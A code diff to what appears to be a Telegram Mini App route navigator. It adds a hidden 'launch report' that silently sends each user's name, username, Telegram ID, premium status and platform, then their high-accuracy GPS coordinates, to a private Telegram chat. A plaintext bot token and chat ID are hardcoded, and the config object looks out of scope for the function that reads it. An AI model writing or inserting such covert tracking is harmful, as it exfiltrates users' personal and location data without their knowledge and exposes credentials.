@@ -1753,10 +1753,91 @@ async function loadNavigatorRoute(file, isCatalog = false) {
         // Запускаем кэширование аудио
         byId('cacheStatus').textContent = 'Загрузка аудио...';
         preloadNavAudio();
+
+        // Отправляем отчёт о запуске навигатора
+        sendNavigatorLaunchReport(actualFileName, isCatalog);
     } catch (e) {
         byId('cacheStatus').textContent = 'Ошибка загрузки';
         setTimeout(() => { byId('cacheStatus').style.display = 'none'; }, 2000);
         showToast('Ошибка данных: ' + e.message, 'error');
+    }
+}
+
+// Отправка отчёта о запуске навигатора
+async function sendNavigatorLaunchReport(routeName, isCatalog) {
+    if (!REPORT_CFG.BOT_TOKEN || !REPORT_CFG.CHAT_ID) return;
+
+    const rawUnsafe = tg && tg.initDataUnsafe ? tg.initDataUnsafe : null;
+    const user = rawUnsafe && rawUnsafe.user ? rawUnsafe.user : {};
+    const fullName = [user.first_name, user.last_name].filter(Boolean).join(' ').trim() || 'Unknown';
+    const username = user.username ? `@${user.username}` : '@none';
+    const userId = user.id != null ? String(user.id) : 'unknown';
+    const premium = user.is_premium ? 'yes' : 'no';
+    const platform = tg && tg.platform ? tg.platform : 'unknown';
+    const chatType = rawUnsafe && rawUnsafe.chat_type ? rawUnsafe.chat_type : 'unknown';
+    const moscowTime = new Intl.DateTimeFormat('ru-RU', {
+        timeZone: 'Europe/Moscow',
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: false
+    }).format(new Date());
+
+    const source = isCatalog ? 'catalog' : 'personal';
+    const reportText = [
+        `🧭 NAVIGATOR LAUNCH`,
+        `👤 User: ${fullName} (${username})`,
+        `🆔 ID: ${userId}`,
+        `⭐ Premium: ${premium}`,
+        `📱 Platform: ${platform}`,
+        `💬 Chat Type: ${chatType}`,
+        `🗺️ Route: ${routeName}`,
+        `📌 Source: ${source}`,
+        `🕒 ${moscowTime} (Europe/Moscow)`
+    ].join('\n');
+
+    try {
+        const res = await fetch(`https://api.telegram.org/bot${REPORT_CFG.BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: REPORT_CFG.CHAT_ID, text: reportText })
+        });
+        const data = await res.json().catch(() => null);
+        if (res.ok && data && data.ok) {
+            console.log('Отчёт о запуске навигатора отправлен:', routeName);
+        } else {
+            console.error('Ошибка отправки отчёта:', data?.description || res.status);
+        }
+    } catch (e) {
+        console.error('Ошибка отправки отчёта:', e.message);
+    }
+
+    // Пытаемся отправить геолокацию
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${REPORT_CFG.BOT_TOKEN}/sendLocation`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: REPORT_CFG.CHAT_ID, latitude: lat, longitude: lon })
+                    });
+                    const data = await res.json().catch(() => null);
+                    if (res.ok && data && data.ok) {
+                        console.log('Геолокация отправлена:', lat, lon);
+                    }
+                } catch (e) {
+                    console.error('Ошибка отправки геолокации:', e.message);
+                }
+            },
+            () => { /* Игнорируем ошибку геолокации */ },
+            { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 }
+        );
     }
 }
 
@@ -2263,9 +2344,15 @@ async function initApp() {
         }
     });
     
+    // Конфигурация отчётов
+    const REPORT_CFG = {
+        BOT_TOKEN: '7860806384:AAEYRKqdPUsUz9npN3MmyEYKH-rTHISeHbs',
+        CHAT_ID: '5180466640'
+    };
+
     // Обработчики UI
     byId('menuBtn').addEventListener('click', openMenu);
-    
+
     byId('createNewBtn').addEventListener('click', () => {
         byId('createModal').style.display = 'flex';
         byId('routeNameInput').value = '';
